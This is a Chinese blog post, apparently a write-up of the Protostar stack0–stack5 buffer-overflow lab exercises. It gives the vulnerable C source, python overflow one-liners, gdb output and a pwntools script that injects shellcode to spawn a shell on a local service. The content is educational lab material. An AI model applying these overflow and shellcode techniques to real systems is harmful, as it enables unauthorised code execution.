@@ -1,0 +1,1226 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Pwn," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Lhaihai's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7">
+<meta name="keywords" content="Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Protostart Stack Writeup">
+<meta property="og:url" content="http://blog.Lhaihai.wang/2018/08/15/Protostart Stack Writeup/index.html">
+<meta property="og:site_name" content="Lhaihai&#39;s Blog">
+<meta property="og:description" content="stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Protostart%20Stack%20Writeup.assets/1534902782677.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Protostart%20Stack%20Writeup.assets/1534999688770.png">
+<meta property="og:updated_time" content="2018-08-23T17:11:51.926Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Protostart Stack Writeup">
+<meta name="twitter:description" content="stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7">
+<meta name="twitter:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Protostart%20Stack%20Writeup.assets/1534902782677.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://blog.Lhaihai.wang/2018/08/15/Protostart Stack Writeup/"/>
+
+
+
+
+
+  <title>Protostart Stack Writeup | Lhaihai's Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-117483741-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+  
+  <script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+ 
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lhaihai's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.Lhaihai.wang/2018/08/15/Protostart Stack Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lhaihai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lhaihai's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Protostart Stack Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-15T14:47:56+08:00">
+                2018-08-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o">本文总阅读量</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li style="list-style: none"><input type="checkbox" checked> stack0</li>
+<li style="list-style: none"><input type="checkbox" checked> stack1</li>
+<li style="list-style: none"><input type="checkbox" checked> stack2</li>
+<li style="list-style: none"><input type="checkbox" checked> stack3</li>
+<li style="list-style: none"><input type="checkbox" checked> stack4</li>
+<li style="list-style: none"><input type="checkbox" checked> stack5</li>
+<li style="list-style: none"><input type="checkbox" checked> stack6</li>
+<li style="list-style: none"><input type="checkbox" checked> stack7</li>
+</ul>
+<a id="more"></a>
+<h3 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have changed the 'modified' variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again?\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路：溢出改变modified的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*68&quot; | ./stack0</span><br></pre></td></tr></table></figure>
+<h3 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please specify an argument\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x61626364</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly got the variable to the right value\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路：buffer溢出改变modified的值为0x61626364 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ ./stack1 `python -c &quot;print &apos;A&apos;*64+&apos;\x64\x63\x62\x61&apos; &quot;`</span><br><span class="line">you have correctly got the variable to the right value</span><br></pre></td></tr></table></figure>
+<h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">char</span> *variable;</span><br><span class="line"></span><br><span class="line">  variable = getenv(<span class="string">"GREENIE"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(variable == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please set the GREENIE environment variable\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, variable);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x0d0a0d0a</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly modified the variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路：buffer溢出改变modified的值为0x0d0a0d0a，而buffer是从环境变量GREENIE复制过来的，所以设置一下该环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ export GREENIE=`python -c &quot;print &apos;A&apos;*64+&apos;\x0a\x0d\x0a\x0d&apos;&quot;`</span><br><span class="line">user@protostar:/opt/protostar/bin$ ./stack2</span><br><span class="line">you have correctly modified the variable</span><br></pre></td></tr></table></figure>
+<h3 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">volatile</span> <span class="title">int</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  fp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fp) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);</span><br><span class="line">      fp();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路：buffer溢出覆盖fp，修改fp的值为win函数的地址</p>
+<p>gdb查看win地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ gdb -q /opt/protostar/bin/stack3</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack3...done.</span><br><span class="line">(gdb) disas win</span><br><span class="line">Dump of assembler code for function win:</span><br><span class="line">0x08048424 &lt;win+0&gt;:	push   %ebp</span><br><span class="line">0x08048425 &lt;win+1&gt;:	mov    %esp,%ebp</span><br><span class="line">0x08048427 &lt;win+3&gt;:	sub    $0x18,%esp</span><br><span class="line">0x0804842a &lt;win+6&gt;:	movl   $0x8048540,(%esp)</span><br><span class="line">0x08048431 &lt;win+13&gt;:	call   0x8048360 &lt;puts@plt&gt;</span><br><span class="line">0x08048436 &lt;win+18&gt;:	leave  </span><br><span class="line">0x08048437 &lt;win+19&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;A&apos;*64+&apos;\x24\x84\x04\x08&apos; &quot; | ./stack3</span><br><span class="line">calling function pointer, jumping to 0x08048424</span><br><span class="line">code flow successfully changed</span><br></pre></td></tr></table></figure>
+<h3 id="stack4"><a href="#stack4" class="headerlink" title="stack4"></a>stack4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路：覆盖ret为win地址(0x080483f4)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ gdb -q /opt/protostar/bin/stack4</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack4...done.</span><br><span class="line">(gdb) disas win</span><br><span class="line">Dump of assembler code for function win:</span><br><span class="line">0x080483f4 &lt;win+0&gt;:	push   %ebp</span><br><span class="line">0x080483f5 &lt;win+1&gt;:	mov    %esp,%ebp</span><br><span class="line">0x080483f7 &lt;win+3&gt;:	sub    $0x18,%esp</span><br><span class="line">0x080483fa &lt;win+6&gt;:	movl   $0x80484e0,(%esp)</span><br><span class="line">0x08048401 &lt;win+13&gt;:	call   0x804832c &lt;puts@plt&gt;</span><br><span class="line">0x08048406 &lt;win+18&gt;:	leave  </span><br><span class="line">0x08048407 &lt;win+19&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048408 &lt;main+0&gt;:	push   %ebp</span><br><span class="line">0x08048409 &lt;main+1&gt;:	mov    %esp,%ebp</span><br><span class="line">0x0804840b &lt;main+3&gt;:	and    $0xfffffff0,%esp</span><br><span class="line">0x0804840e &lt;main+6&gt;:	sub    $0x50,%esp</span><br><span class="line">0x08048411 &lt;main+9&gt;:	lea    0x10(%esp),%eax</span><br><span class="line">0x08048415 &lt;main+13&gt;:	mov    %eax,(%esp)</span><br><span class="line">0x08048418 &lt;main+16&gt;:	call   0x804830c &lt;gets@plt&gt;</span><br><span class="line">0x0804841d &lt;main+21&gt;:	leave  </span><br><span class="line">0x0804841e &lt;main+22&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>断点调试得offset为76，过程参考视频</p>
+<p><a href="https://www.youtube.com/watch?v=8QzOC8HfOqU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=8QzOC8HfOqU</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;A&apos;*76+&apos;\xf4\x83\x04\x08&apos; &quot; | ./stack4</span><br><span class="line">code flow successfully changed</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+<h3 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) define hook-stop</span><br><span class="line">Type commands for definition of &quot;hook-stop&quot;.</span><br><span class="line">End with a line saying just &quot;end&quot;.</span><br><span class="line">&gt;x/1i $eip</span><br><span class="line">&gt;x/8wx $esp</span><br><span class="line">&gt;end</span><br></pre></td></tr></table></figure>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Protostart%20Stack%20Writeup.assets/1534902782677.png" alt="1534902782677"></p>
+<p>buf地址 0xf6ffefd0</p>
+<p>offset  76</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">payload = sh + <span class="string">'a'</span>*(<span class="number">76</span>-len(sh)) + p32(<span class="number">0xf6ffefd0</span>) + <span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line">conn.send(payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<p>用qira真方便，一下子就出来了，搞gdb搞了我几个小时都没弄出来</p>
